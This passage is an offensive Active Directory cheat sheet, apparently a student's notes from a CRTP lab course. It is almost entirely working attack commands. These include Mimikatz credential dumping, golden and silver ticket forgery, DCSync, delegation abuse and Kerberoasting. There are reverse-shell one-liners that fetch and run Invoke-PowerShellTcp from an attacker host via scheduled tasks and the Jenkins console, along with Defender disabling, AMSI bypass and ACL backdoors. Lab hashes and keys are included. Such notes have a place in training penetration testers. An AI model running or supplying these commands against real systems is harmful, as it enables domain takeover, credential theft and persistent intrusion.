    # Enumerate users and computers with constrained delegation enabled
    # PowerView
    Get-DomainUser -TrustedToAuth
    Get-DomainComputer -TrustedToAuth
    
    # Using ActiveDirectory Module
    Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
    ```
    
- Privilege Escalation
    
    ```powershell
    # Using PowerUp script
    # Get services with unquoted paths and a space in thier name
    Get-UnquotedService -Verbose
    # Get services where the current user can write to its binary path or change arguments to the binary
    Get-ModifiableServiceFile -Verbose
    # Get the services whose configureation current user can modify
    Get-ModifiableService -Verbose
    
    ```
    
    ```powershell
    # Unconstrained Delegation
    # Discover domain computers which have unconstrained delegation enable using powerview:
    Get-NetComputer -UnConstrained
    # Using ActiveDirectory module:
    Get-ADComputer -Filter {TrustedForDelegation -eq $True}
    Get-ADUser -Filter {TrustedForDelegation -eq $True}
    # Compromise the server where Unconstrained Delegation is enable.
    # Run following command on it to check if any DA token is available:
    Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
    ```
    
- Add User to Domain Admins Group
    
    ```powershell
    # install RAST-AD-POWERSHELL
    Install-WindowsFeature RSAT-AD-PowerShell
    # add user to domain admins group 
    Add-ADGroupMember -Identity "Domain Admins" -Members dcorp\student111
    ```
    
- Priv Esc - DNSAdmin
    - Info
        1. It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM)
        2. In case the DC also serves as DNS, this will provide us escalation to DA
        3. Need privileges to restart the DNS service
    
    ```powershell
    # Enumerate the members of the DNSAdmins group 
    Get-NetGroupMember -GroupName "DNSAdmins"
    # Using ActiveDirectory module
    Get-ADGroupMember -Identity DNSAdmins
    
    # One we know the memebers of the DNSAdmins group, we need to compromise a member. 
    # We already have hash of srvadmin because of derivative local admin. 
    # From the privileges of DNSAdmins group memeber, configure DLL 
    msfvenom -p windows/x64/exec cmd='net group "Domain Admins" <username> /domain/add' -f dll -o <filename>
    # create shared folder from the windows attackint machine, where the DLL located.
    # Use the below command (needs RSAT DNS):
    dnscmd <dcname> /config /serverlevelplugindll \\<ip address attacker machine\sharedfolder>\DLLname 
    # Restart the DNS 
    sc \\DC-1 stop dns
    sc \\DC-1 start dns 
    ```
    
- Lateral Movement - PowerShell Remoting
    
    ```powershell
    # Enable PS-Remoting
    Powershell -ep bypass Enable-PSRemoting -force
    # Start PSsession 
    Enter-PSSession -ComputerName DC-1.sec.local -Credential shabi:Aa123456
    # If we have local admin privilege on another machins run the command:
    . .\PowerView.ps1
    Find-LocalAdminAcess
    Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
    # To hold the credentials in the memmory 
    $sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
    # In case of you wont to enter to $sess
    Enter-PSSession -Session $sess
    # to execute command on the target machine:
    Invoke-Command -ComputerName PC-2.sec.local -ScriptBlock{whoami;hostname}
    # to execute script on the target machine:
    Invoke-Command -ComputerName PC-2.sec.local -FilePath C:\Users\shabi\Desktop\PowerUp.ps1
    
    # Use the below to execute commands or scriptblocks:
    Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list of servers>)
    
    # Use the below to execute scripts from files
    # Get-PassHashes = The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
    Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list of servers>)
    
    # To load script remotly on the target server 
    $sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
    # Get-PassHashes = The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
    Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -Session $sess 
    ```
    
- Lateral Movement - Winrs
    
    ```powershell
    # execute command on remote server 
    winrs -r:dcorp-mgmt hostname;whoami
    
    # Open remote connection with cmd 
    winrs -r:dcorp-mgmt cmd
    ```
    
- Lateral Movement - copy file to remote host
    
    ```powershell
    echo F | xcopy C:\AD\Tools\Loader.exe \\finance-dc\C$\Users\Public\Loader.exe
    ```
    
- Lateral Movement - Port Forwarded on remote host
    
    ```powershell
    # port forware with winrs 
    $null | winrs -r:finance-dc "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"
    # Use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt
    $null | winrs -r:finance-dc C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
    ```
    
- enable RDP
    
    ```powershell
    # Admin Priv 
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    ```
    
- Current Language Mode
    
    ```powershell
    $ExecutionContext.SessionState.LanguageMode
    ```
    
- Lateral Movement - Invoke-Mimikatz
    
    ```powershell
    # Dump credentials on a local machine
    Invoke-Mimikatz -DumpCreds
    # Dump credentials on multiple remote machines
    Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
    # Over pass the hash generate tokens from hashes
    Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:sec.local /ntlm:<ntlmhash> /run:powershell.exe"'
    ```
    
- Persistence - Golden Ticket
    
    ```powershell
    # Execute mimikatz on DC to get krbtgt hash:
    Invoke-Mimikatz -Command '" lsadump::lsa /patch"' -ComputerName DC-1
    ```
    
    ```powershell
    # Disable Defender 
    Set-MpPreference -DisableRealtimeMonitoring $true
    ```
    
    ```powershell
    # after abusing domain admin user 
    # create session to the DC
    # AMSI bypass 
    $Sess = New-PSSession -ComputerName DC-1.sec.local 
    Invoke-Command -Session $Sess -FilePath C:\AD\Tools\Invoke-MimikatzEx.ps1 
    Enter-PSSession -Session $Sess
    # on the dc run the command:
    Invoke-Mimikatz -Command '" lsadump::lsa /patch"'
    ```
    
    ```powershell
    # after we take the krbtgt hash from the invoke mimikatz command we will create a Golden Ticket
    Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:sec.local /sid: /krbtgt: id:500 /group:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
    ```
    
    ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%207.png)
    
    ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%208.png)
    
    ```powershell
    # To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges:
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:DomainName\krbtgt
    ```
    
- Persistence - **Custom SSP**
    - Info
        
        ```powershell
        # We can set our on SSP by dropping a custom dll, 
        # for example mimilib.dll from mimikatz, 
        # that will monitor and capture plaintext passwords from users that logged on!
        ```
        
    
    ```powershell
    #Get current Security Package:
    $packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'
    
    #Append mimilib:
    $packages += "mimilib"
    
    #Change the new packages name
    Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
    Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages
    
    #ALTERNATIVE:
    Invoke-Mimikatz -Command '"misc::memssp"'
    ```
    
    - Info
        
        Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log
        
- Persistence - ACLs
    
    ```powershell
    # insert a domain user to ACL of domain admins 
    
    # Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
    Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountNmae <username> -Rights All -Verbos
    
    # Using ActiveDirectory Module and Set-ADACL:
    https://github.com/lipkau/PsADManagement/blob/master/Functions/Set-ADACL.ps1 
    Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=sec,DC=local' -Principal student1 -Verbose
    
    # Abusing ResetPassword using PowerView_dev:
    Set-DomainUserPassword -Identity usertest -AccountPassword (ConvertTo-SecureString "password123" -AsPlainText -Force) -Verbose
    
    # Using ActiveDirectory Module: 
    Set-ADAccountPassword -Identity usertest -NewPassword (ConvertTo-SecureString "password123" -AsPlainText -Force) -Verbose
    
    ```
    
- Persistence - ACLs - Security Description - WMI
    
    ```powershell
    # pass the Set-RemoteWMI script to the domain controller 
    https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1
    # ACLs can be modified to allow non-admin users access to securable objects.
    # On local machine for user:
    Set-RemoteWMI -UserName <username> -Verbose
    # On remote machine wwithout explicit credentials:
    Set-RemoteWMI -UserName <username> -ComputerName DC-1 -namespace 'root\cimv2' -Verbose
    
    # Option 2 :
    # Escelate your privilege to domain admin
    C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
    # Load the RACE.ps1 from the elevated shell
    . C:\AD\Tools\RACE.ps1
    # Modified the ACL for the user:
    Set-RemoteWMI -SamAccountName student111 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
    # From normal shell run the below command :
    gwmi -class win32_operatingsystem -ComputerName dcorp-dc
    
    # To retrieve machine account hash without DA, 
    # first we need to modify permissions on the DC.
    . C:\AD\Tools\RACE.ps1
    Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee studentx -Verbose
    # Now, we can retreive hash as studentx:
    . C:\AD\Tools\RACE.ps1
    Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
    # We can use the machine account hash to create Silver Tickets. Create Silver Tickets for HOST and RPCSS
    # using the machine account hash to execute WMI queries:
    C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1be12164a06b817e834eb437dc8f581c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
    C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:1be12164a06b817e834eb437dc8f581c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
    # Run the below command:
    gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
    ```
    
- Persistence - ACLs - Security Description - PowerShell Remoting
    
    ```powershell
    https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1
    
    # On local machine for user:
    Set-RemotePSRemoting -UserName <username> -Verbose
    # On remote machine for <username> without credentials:
    Set-RemotePSRemoting -UserName <username> -ComputerName DC-1 -Verbose
    ```
    
- Persistence - schtasks (reverse shell)
    
    ```powershell
    # use the service HOST from Constrained Delegation
    # run hfs 
    # Create a copy of Invoke-PowerShellTcp.ps1 and rename it to Invoke-PowerShellTcpEx.ps1.
    # Open Invoke-PowerShellTcpEx.ps1 in PowerShell ISE (Right click on it and click Edit).
    # Add "Power -Reverse -IPAddress 172.16.100.X -Port 443" (without quotes) to the
    # end of the file
    # Run the below command in the process where we injected the ticket for HOST service.
    schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.111/InvokePowerShellTcpEx.ps1''')'"
    # Start listiner on port 443 with nc64.exe 
    # Run the below command to execute the task
    schtasks /Run /S mcorp-dc.moneycorp.local /TN "UserX"
    ```
    
- Kerberoast
    
    ```powershell
    # Find user account used as Service accounts: 
    # PowerView
    Get-NetUser -SPN 
    # ActiveDirectory module:
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
    # Request a TGS
    Add-Type -AssemblyName System.IdentityModel 
    
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433"
    # Run klist to see all the ticket from the memory
    klist
    # save the tickets on the disk with mimikatz.ps1
    Invoke-Mimikatz -Command '"kerberos::list /export"'
    # use the below tool (Python tool) to offline crack the SPN hash
    https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
    https://github.com/OWASP/passfault/blob/master/wordlists/wordlists/10k-worst-passwords.txt
    
    python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~sec.local
    
    # Rubeus
    .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
    # Use john de ripper to crack:
    C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.kerberoast
    .\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
    .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins
    
    # Invoke-Kerberoast
    iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
    Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
    ```
    
- Legacy system
    - Jenkins
        
        # disable firewall
        
        use HFS to run web server
        
        ```powershell
        # in the Jenkins console script 
        powershell iex (iwr -UseBasicParsing http://172.16.100.111/Invoke-PowerShellTcp.ps1);Power -Reverse -IPAddress 172.16.100.111 -Port 443
        # attacker machine 
        .\nc64.exe -lvp 443 
        ```
        
        ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%209.png)
        
        ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%2010.png)
        
        ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%2011.png)
        
- DCSync Attack
    
    ```powershell
    # Load PowerView.ps1
    Get-ObjectAcl "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
    # check if the user have the permision to run the attack :
    Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} |?{$_.IdentityName -match "student111"}
    # get the hashes of krbtgt user or any other user with SafetyKatz.exe:
    C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
    ```
    
- Unconstrained Delegation
    
    ```powershell
    # Find a server in the dcorp domain where Unconstrained Delegation is enabled.
    . C:\AD\Tools\PowerView.ps1
    Get-DomainComputer -Unconstrained | select -ExpandProperty name
    # try with appadmin. Run the below command from an elevated command prompt:
    C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe" "exit"
    # Run the below commands in the new process:
    C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
    . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
    Find-PSRemotingLocalAdminAccess
    # copy Rubeus to dcorp-appsrv to abuse Printer Bug!
    # Printer Bug - Copy Rubeus using xcopy and execute using winrs
    echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y
    # Run Rubeus in listener mode
    winrs -r:dcorp-appsrv cmd
    C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
    # On the student VM, use MS-RPRN to force authentication from dcorp-dc$
    C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
    # On the Rubeus listener, we can see the TGT of dcorp-dc$
    # Copy the base64 encoded ticket and use it with Rubeus on student VM. 
    # Run the below command from an elevated shell
    C:\AD\Tools\Rubeus.exe ptt /ticket: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
    # run DCSync from this process:
    C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
    # Escalation to Enterprise Admins
    # To get Enterprise Admin privileges, we need to force authentication from mcorp-dc. Run the below
    # command to listern for mcorp-dc$ tickets on dcorp-appsrv:
    winrs -r:dcorp-appsrv cmd
    C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
    # Use MS-RPRN on the student VM to trigger authentication from mcorp-dc to dcorp-appsrv:
    C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
    # As previously, copy the base64 encoded ticket and use it with Rubeus on student VM. Run the below
    # command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be
    # run from an elevated process:
    C:\AD\Tools\Rubeus.exe ptt /ticket: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
    # Now, we can run DCSync from this process:
    C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
    ```
    
- Constrained Delegation
    
    ```powershell
    # To enumerate users with constrained delegation we can use PowerView
    . C:\AD\Tools\PowerView.ps1
    Get-DomainUser -TrustedToAuth
    # Abuse Constrained Delegation using websvc with Rubeus
    # In the below command, we request get a TGS for websvc as the Domain Administrator
    C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
    # Check if the TGS is injected:
    klist
    # Try accessing filesystem on dcorp-mssql:
    dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
    ```
    
    ```powershell
    # Abuse Constrained Delegation using websvc with Kekeo
    .\kekeo.exe
    # use the tgt::ask module from kekeo to request a TGT from websvc
    tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
    # use this TGT and request a TGS
    tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:http/dcorpmssql.dollarcorp.moneycorp.LOCAL
    # Next, inject the ticket in current session to use it:
    . C:\AD\Tools\Invoke-Mimi.ps1
    Invoke-Mimi -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_http~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
    ```
    
    ```powershell
    # enumerate the computer accounts with constrained delegation enabled using
    # PowerView:
    Get-DomainComputer -TrustedToAuth
    # Abuse Constrained Delegation using dcorp-adminsrv with Rubeus
    # We have the AES keys of dcorp-adminsrv$ from dcorp-adminsrv machine. Run the below command
    # from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that:
    C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
    # Run the below command to abuse the LDAP ticket:
    C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
    ```
    
    ```powershell
    # https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
    # Find a computer object in dcorp domain where we have Write permissions.
    # Use PowerView
    Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
    # Abuse this user and start process with him credentials
    # Load the Powerview.ps1 in the new process and run :
    Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std111$' -Verbose
    # Get AES keys of your student VM
    C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
    # With Rubeus, abuse the RBCD to access dcorp-mgmt as Domain Administrator - Administrator:
    C:\AD\Tools\Rubeus.exe s4u /user:dcorp-student1$ /aes256:ee491b85604e2cfbfd95c59840c3141f722b1a8b79664ce8d4694325f5068481 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
    # Connect to the machine with winrs
    winrs -r:dcorp-mgmt cmd
    ```
    
- ****Kerberos Resource-based Constrained Delegation: Computer Object Takeover****
    
    ```powershell
    # Find a computer object in dcorp domain where we have Write permissions.
    # Use PowerView
    Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
    # Abuse this user and start process with him credentials
    # Load the Powerview.ps1 in the new process and run :
    Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std111$' -Verbose
    # Get AES keys of your student VM
    C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
    # With Rubeus, abuse the RBCD to access dcorp-mgmt as Domain Administrator - Administrator:
    C:\AD\Tools\Rubeus.exe s4u /user:dcorp-student1$ /aes256:ee491b85604e2cfbfd95c59840c3141f722b1a8b79664ce8d4694325f5068481 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
    # Connect to the machine with winrs
    winrs -r:dcorp-mgmt cmd
    ```
    

### **Cross Forest Attacks**

- Priv Esc - Across Forest using Trust Tickets
    
    ```powershell
    # Requeire the trust key for the inter-forest trust.
    Invoke-Mimikatz -Command '"lsadump::trust /patch"'
    # Or 
    Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
